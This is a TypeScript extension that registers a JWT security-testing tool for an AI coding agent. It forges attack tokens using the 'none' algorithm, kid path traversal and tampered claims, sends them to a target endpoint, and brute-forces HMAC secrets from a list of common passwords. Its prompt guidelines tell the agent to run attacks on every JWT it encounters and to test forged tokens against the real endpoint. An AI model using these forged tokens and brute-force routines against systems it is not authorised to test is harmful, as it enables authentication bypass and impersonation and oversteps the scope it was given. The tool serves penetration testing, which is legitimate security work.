/**
 * JWT Analyzer Extension — Comprehensive JWT security testing.
 *
 * Analyzes JWT tokens for common vulnerabilities: algorithm confusion,
 * weak HMAC secrets, claim manipulation, kid injection, JWK/JKU injection.
 * Uses Web Crypto API for cryptographic operations when available.
 *
 * Ported from Trapframe jwt-analyzer tool.
 */

import { StringEnum } from "@earendil-works/pi-ai";
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import { Text } from "@earendil-works/pi-tui";
import { Type } from "typebox";

const JwtActionEnum = StringEnum(["analyze", "verify", "bruteforce"] as const, {
	description: "analyze = structural analysis, verify = test tokens against endpoint, bruteforce = try weak HMAC secrets",
});

const JwtParams = Type.Object({
	action: JwtActionEnum,
	token: Type.String({ description: "JWT token string" }),
	verifyUrl: Type.Optional(Type.String({ description: "URL for verify action" })),
	verifyHeader: Type.Optional(Type.String({ description: "Custom Authorization header prefix. Default: Bearer" })),
	secretWordlist: Type.Optional(Type.String({ description: "Comma-separated candidate secrets for bruteforce" })),
});

interface JwtHeader {
	alg: string;
	typ?: string;
	kid?: string;
	jku?: string;
	jwk?: any;
	[k: string]: unknown;
}

interface JwtPayload {
	[k: string]: unknown;
	iat?: number;
	exp?: number;
	nbf?: number;
	iss?: string;
	sub?: string;
	aud?: string | string[];
}

interface JwtAnalysis {
	header: JwtHeader;
	payload: JwtPayload;
	signature: string;
	decoded: { headerBase64: string; payloadBase64: string; sigBase64: string };
	issues: string[];
	attackTokens: { name: string; token: string; description: string }[];
}

const COMMON_SECRETS = [
	"secret", "password", "admin", "key", "private", "jwt_secret",
	"jwt", "token", "apisecret", "api_secret", "changeme", "changethis",
	"test", "testing", "dev", "development", "prod", "production",
	"super_secret", "supersecret", "my_secret", "mysecret",
	"123456", "12345678", "123456789", "1234567890",
	"secret_key", "secretkey", "secret123", "password123",
	"qwerty", "abc123", "monkey", "dragon", "master",
	"letmein", "trustno1", "sunshine", "iloveyou", "princess",
	"welcome", "shadow", "michael", "football", "baseball",
	"batman", "access", "hello", "charlie", "donald",
];

function base64UrlDecode(str: string): string {
	str = str.replace(/-/g, "+").replace(/_/g, "/");
	while (str.length % 4) str += "=";
	try {
		return new TextDecoder().decode(Uint8Array.from(atob(str), (c) => c.charCodeAt(0)));
	} catch {
		return "[decode error]";
	}
}

function base64UrlEncode(obj: any): string {
	const json = JSON.stringify(obj);
	return btoa(json).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
}

async function hmacSign(data: string, secret: string, algorithm: string): Promise<string> {
	const enc = new TextEncoder();
	const algo = algorithm === "HS256" ? "SHA-256" : algorithm === "HS384" ? "SHA-384" : "SHA-512";
	try {
		const key = await crypto.subtle.importKey("raw", enc.encode(secret), { name: "HMAC", hash: algo }, false, ["sign"]);
		const sig = await crypto.subtle.sign("HMAC", key, enc.encode(data));
		return base64urlFromBuffer(sig);
	} catch {
		return "";
	}
}

function base64urlFromBuffer(buffer: ArrayBuffer): string {
	const bytes = new Uint8Array(buffer);
	let binary = "";
	for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
	return btoa(binary).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
}

function analyzeToken(token: string): JwtAnalysis | { error: string } {
	const parts = token.split(".");
	if (parts.length !== 3) {
		return { error: "Invalid JWT: expected 3 parts (header.payload.signature)" };
	}

	const headerBase64 = parts[0];
	const payloadBase64 = parts[1];
	const sigBase64 = parts[2];

	let header: JwtHeader;
	let payload: JwtPayload;

	try {
		header = JSON.parse(base64UrlDecode(headerBase64));
	} catch {
		return { error: "Failed to decode JWT header" };
	}
	try {
		payload = JSON.parse(base64UrlDecode(payloadBase64));
	} catch {
		return { error: "Failed to decode JWT payload" };
	}

	const issues: string[] = [];
	const attackTokens: { name: string; token: string; description: string }[] = [];

	// Check for algorithm issues
	const alg = (header.alg || "").toUpperCase();

	if (alg === "NONE" || alg === "none") {
		issues.push("Algorithm is 'none' — signature verification disabled");
	}

	// None algorithm attack
	if (alg !== "NONE" && alg !== "none") {
		const noneHeader = { ...header, alg: "none" };
		const noneToken = `${base64UrlEncode(noneHeader)}.${payloadBase64}.`;
		attackTokens.push({
			name: "none algorithm",
			token: noneToken,
			description: "Sets algorithm to 'none' to bypass signature verification entirely. Many JWT libraries have historically accepted this.",
		});
	}

	// HS256 confusion attack (when RS256 used)
	if (alg.startsWith("RS") || alg.startsWith("ES") || alg.startsWith("PS")) {
		issues.push(`Asymmetric algorithm (${alg}) — confirm the public key is not exposed`);
		const hsHeader = { ...header, alg: "HS256" };
		const hsPayload = base64UrlEncode(hsHeader) + "." + payloadBase64;
		attackTokens.push({
			name: "algorithm confusion (HS256)",
			token: "",
			description: "If server accepts HS256 instead of RS256, the public key can be used as HMAC secret for forging tokens.",
		});
	}

	// Check kid injection
	if (header.kid) {
		issues.push(`kid parameter present: ${header.kid} — potential for path traversal injection`);
		const kidHeader = { ...header, kid: "../../../../../../dev/null" };
		const kidToken = `${base64UrlEncode(kidHeader)}.${payloadBase64}.`;
		attackTokens.push({
			name: "kid path traversal",
			token: kidToken,
			description: "kid injection with path traversal. If server resolves kid to file path, may read arbitrary files as HMAC secret.",
		});
	}

	// Check jku
	if (header.jku) {
		issues.push(`jku parameter present: ${header.jku} — JWK Set URL, potential SSRF`);
	}

	// Check expiry
	if (payload.exp) {
		const expDate = new Date((payload.exp as number) * 1000);
		const now = Date.now();
		if (expDate.getTime() < now) {
			issues.push(`Token expired at ${expDate.toISOString()}`);
		} else {
			const remaining = Math.round((expDate.getTime() - now) / 60000);
			issues.push(`Token expires ${expDate.toISOString()} (${remaining} min remaining)`);
		}
	} else {
		issues.push("No expiration (exp) claim — token never expires");
	}

	// Check claims
	if (!payload.iss) issues.push("No issuer (iss) claim");
	if (!payload.sub && !payload.aud) issues.push("No subject (sub) or audience (aud) claims");

	// Check sensitive claims
	const sensitiveClaims = ["admin", "role", "permissions", "scope", "is_admin", "isAdmin"];
	for (const claim of sensitiveClaims) {
		if (payload[claim] !== undefined) {
			issues.push(`Sensitive claim: '${claim}' = ${JSON.stringify(payload[claim])}`);
		}
	}

	// Check for user-modifiable claims we can test
	const modifiableClaims = ["sub", "email", "user_id", "userId", "username", "id", "role"];
	for (const claim of modifiableClaims) {
		if (payload[claim] !== undefined) {
			const modPayload = { ...payload, [claim]: typeof payload[claim] === "number" ? (payload[claim] as number) + 1 : `${payload[claim]}_modified` };
			attackTokens.push({
				name: `claim injection: ${claim}`,
				token: `${headerBase64}.${base64UrlEncode(modPayload)}.${sigBase64}`,
				description: `Modified ${claim} from ${JSON.stringify(payload[claim])} to ${JSON.stringify(modPayload[claim])}. If accepted, indicates missing signature validation or weak claims.`,
			});
		}
	}

	return {
		header,
		payload,
		signature: sigBase64,
		decoded: { headerBase64, payloadBase64, sigBase64 },
		issues,
		attackTokens,
	};
}

export default function (pi: ExtensionAPI) {
	pi.registerTool({
		name: "jwt_analyzer",
		label: "JWT Analyzer",
		description: "Analyze JWT tokens for security vulnerabilities: algorithm confusion, claim injection, kid injection, weak HMAC secrets, JWK/JKU attacks. Actions: analyze (structure), verify (test against endpoint), bruteforce (try common secrets).",
		parameters: JwtParams,
		promptSnippet: "Analyze a JWT token for algorithm confusion, claim injection, kid attacks, and weak secrets",
		promptGuidelines: [
			"Use jwt_analyzer on every JWT token you encounter in cookies, headers, or localStorage",
			"Use analyze first to understand the token structure and vulnerabilities",
			"Use verify to test generated attack tokens against the real endpoint",
			"Use bruteforce with common secrets if the token uses HS256/HS384/HS512",
			"Always test the 'none algorithm' attack — it's the most common JWT vulnerability",
			"Check kid injection if the header contains a 'kid' field",
		],

		async execute(_toolCallId, params, _signal, _onUpdate, _ctx) {
			const token = params.token.trim();

			if (params.action === "analyze") {
				const analysis = analyzeToken(token);
				if ("error" in analysis) {
					return {
						content: [{ type: "text", text: `Error: ${analysis.error}` }],
						details: { action: "analyze", issues: 0, attacks: 0 },
					};
				}

				const { header, payload, issues, attackTokens } = analysis;

				let output = "## JWT Structure\n\n";
				output += `**Algorithm:** ${header.alg || "missing"}\n`;
				output += `**Type:** ${header.typ || "JWT"}\n`;
				if (header.kid) output += `**Key ID:** ${header.kid}\n`;
				if (header.jku) output += `**JWK URL:** ${header.jku}\n`;
				output += "\n### Header\n```json\n" + JSON.stringify(header, null, 2) + "\n```\n";
				output += "\n### Payload\n```json\n" + JSON.stringify(payload, null, 2) + "\n```\n";

				if (payload.exp) {
					const exp = new Date((payload.exp as number) * 1000).toISOString();
					output += `\n**Expires:** ${exp}\n`;
				}
				if (payload.iat) {
					const iat = new Date((payload.iat as number) * 1000).toISOString();
					output += `**Issued:** ${iat}\n`;
				}

				output += "\n## Security Analysis\n\n";
				if (issues.length === 0) {
					output += "No obvious structural issues detected.\n";
				} else {
					output += `Found ${issues.length} potential issues:\n\n`;
					for (const issue of issues) {
						output += `- ${issue}\n`;
					}
				}

				if (attackTokens.length > 0) {
					output += `\n## Attack Tokens (${attackTokens.length})\n\n`;
					for (const atk of attackTokens) {
						output += `### ${atk.name}\n`;
						output += `${atk.description}\n`;
						if (atk.token) output += `\n\`\`\`\n${atk.token}\n\`\`\`\n`;
						output += "\n";
					}
					output += "*Use jwt_analyzer action=verify to test these attack tokens against the endpoint.*\n";
				}

				return {
					content: [{ type: "text", text: output }],
					details: { action: "analyze", issues: issues.length, attacks: attackTokens.length },
				};
			}

			if (params.action === "verify") {
				if (!params.verifyUrl) {
					return {
						content: [{ type: "text", text: "Error: verifyUrl required for verify action." }],
						details: { action: "verify" },
					};
				}
				const analysis = analyzeToken(token);
				if ("error" in analysis) {
					return {
						content: [{ type: "text", text: `Error: ${analysis.error}` }],
						details: { action: "verify" },
					};
				}

				const prefix = params.verifyHeader || "Bearer";
				const results: string[] = [];

				// Test original token
				try {
					const res = await fetch(params.verifyUrl, {
						headers: { "Authorization": `${prefix} ${token}` },
					});
					results.push(`Original token: HTTP ${res.status}`);
				} catch (err: unknown) {
					results.push(`Original token: Error - ${err instanceof Error ? err.message : String(err)}`);
				}

				// Test attack tokens
				for (const atk of analysis.attackTokens) {
					if (!atk.token) continue;
					try {
						const res = await fetch(params.verifyUrl, {
							headers: { "Authorization": `${prefix} ${atk.token}` },
						});
						const accepted = res.status < 400;
						results.push(`${accepted ? "✓" : "✗"} ${atk.name}: HTTP ${res.status}${accepted ? " — TOKEN ACCEPTED" : ""}`);
					} catch (err: unknown) {
						results.push(`?  ${atk.name}: Error - ${err instanceof Error ? err.message : String(err)}`);
					}
				}

				const findings = results.filter((r) => r.includes("TOKEN ACCEPTED") || r.includes("Accepted"));

				let output = `## JWT Verification: ${params.verifyUrl}\n\n`;
				output += results.join("\n") + "\n";
				if (findings.length > 0) {
					output += `\n!!! ${findings.length} attack token(s) were accepted by the server !!!\n`;
					output += "The server does not properly validate JWT signatures.\n";
				} else {
					output += "\nAll attack tokens were rejected. Server appears to validate signatures correctly.\n";
				}

				return {
					content: [{ type: "text", text: output }],
					details: { action: "verify", issues: findings.length, attacks: analysis.attackTokens.length },
				};
			}

			if (params.action === "bruteforce") {
				const analysis = analyzeToken(token);
				if ("error" in analysis) {
					return {
						content: [{ type: "text", text: `Error: ${analysis.error}` }],
						details: { action: "bruteforce" },
					};
				}

				const alg = analysis.header.alg?.toUpperCase() || "";
				if (!alg.startsWith("HS")) {
					return {
						content: [{ type: "text", text: `Algorithm is ${alg}, not HMAC-based. Bruteforce only works with HS256/HS384/HS512.` }],
						details: { action: "bruteforce" },
					};
				}

				const secrets = params.secretWordlist
					? params.secretWordlist.split(",").map((s) => s.trim()).filter(Boolean)
					: COMMON_SECRETS;

				const data = `${analysis.decoded.headerBase64}.${analysis.decoded.payloadBase64}`;
				let found: { secret: string; token: string } | null = null;

				for (const secret of secrets) {
					const sig = await hmacSign(data, secret, alg);
					if (sig === analysis.signature) {
						found = { secret, token: `${data}.${sig}` };
						break;
					}
				}

				if (found) {
					const output = [
						`!!! HMAC Secret Found !!!`,
						`Secret: "${found.secret}"`,
						`Algorithm: ${alg}`,
						"",
						"This token's signature was verified using a weak/common secret.",
						"An attacker can forge arbitrary tokens using this secret.",
						"",
						"Impact:",
						"- Forge tokens with any claims (elevate privileges, impersonate users)",
						"- Tokens will pass signature verification",
						"",
						"Remediation:",
						"- Use a cryptographically strong random secret (≥256 bits for HS256)",
						"- Consider switching to RS256/ES256 for better key management",
					].join("\n");

					return {
						content: [{ type: "text", text: output }],
						details: { action: "bruteforce", found: true, secretLength: found.secret.length },
					};
				}

				return {
					content: [{ type: "text", text: `Bruteforce complete: tested ${secrets.length} common secrets — no match found.\n\nToken uses a non-trivial secret that was not in the wordlist.` }],
					details: { action: "bruteforce", found: false, tested: secrets.length },
				};
			}

			return {
				content: [{ type: "text", text: `Unknown action: ${params.action}` }],
				details: { action: params.action },
			};
		},

		renderCall(args, theme, _context) {
			const action = (args.action as string) || "analyze";
			let text = theme.fg("toolTitle", theme.bold("jwt ")) + theme.fg("accent", action);
			if (args.token) {
				const preview = (args.token as string).length > 30 ? `${(args.token as string).slice(0, 30)}...` : args.token;
				text += ` ${theme.fg("dim", preview)}`;
			}
			return new Text(text, 0, 0);
		},

		renderResult(result, _opts, theme, _context) {
			const details = result.details as any;
			if (!details) {
				const t = result.content[0];
				return new Text(t?.type === "text" ? t.text.slice(0, 100) : "", 0, 0);
			}
			if (details.found) {
				return new Text(theme.fg("error", `!!! HMAC secret found (${details.secretLength} chars) !!!`), 0, 0);
			}
			if (details.issues > 0) {
				return new Text(
					theme.fg("warning", `${details.issues} issues, ${details.attacks} attack tokens`),
					0, 0,
				);
			}
			return new Text(theme.fg("success", "No issues found"), 0, 0);
		},
	});
}
